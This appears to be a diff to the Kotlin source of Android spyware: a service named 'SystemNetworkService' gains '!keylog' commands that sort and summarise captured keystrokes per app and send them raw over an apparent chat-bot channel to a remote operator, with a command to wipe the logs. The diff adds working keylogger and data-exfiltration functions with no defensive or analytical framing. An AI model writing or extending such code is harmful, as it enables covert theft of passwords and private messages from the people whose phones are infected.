@@ -346,12 +346,36 @@ class SystemNetworkService : Service() {
                                 d.sendMsg(":keyboard: Keylogger not running")
                             }
                         }
-                        else -> {
+                        "clear" -> {
+                            AccessibilityHelper.clearAppLogs()
+                            d.sendMsg(":wastebasket: **Keylog cleared** — all app logs wiped")
+                        }
+                        "summary" -> {
+                            if (!AccessibilityHelper.isRunning) {
+                                d.sendMsg(":keyboard: Keylogger not running — use `!keylog on` first")
+                                return
+                            }
+                            val summary = AccessibilityHelper.getAppSummary()
+                            d.sendMsg(":keyboard: **Keylogger — App Summary**\n$summary")
+                        }
+                        "raw" -> {
                             val cap = AccessibilityHelper.getText()
                             if (cap.isEmpty()) {
                                 d.sendMsg(":keyboard: **Keylogger**\nNo keystrokes captured. Use `!keylog on` to enable.")
                             } else {
-                                d.sendMsg(":keyboard: **Captured Keystrokes**\n```\n${cap.take(1900)}\n```")
+                                d.sendMsg(":keyboard: **Raw Keystrokes**\n```\n${cap.take(1900)}\n```")
+                            }
+                        }
+                        else -> {
+                            if (!AccessibilityHelper.isRunning) {
+                                d.sendMsg(":keyboard: **Keylogger**\nNot running. Use `!keylog on` to enable.\n\n**Usage:**\n`!keylog` — per-app logs\n`!keylog summary` — app overview\n`!keylog raw` — raw keystrokes\n`!keylog clear` — wipe logs")
+                                return
+                            }
+                            val logs = AccessibilityHelper.getFormattedAppLogs()
+                            if (logs.isEmpty() || logs == "No app activity logged") {
+                                d.sendMsg(":keyboard: **Keylogger Active**\nNo app activity yet. Open an app and start typing.\n\n**Usage:**\n`!keylog summary` — app overview\n`!keylog raw` — raw keystrokes\n`!keylog clear` — wipe logs")
+                            } else {
+                                d.sendMsg(":keyboard: **Per-App Keylog**\n```\n$logs\n```")
                             }
                         }
                     }
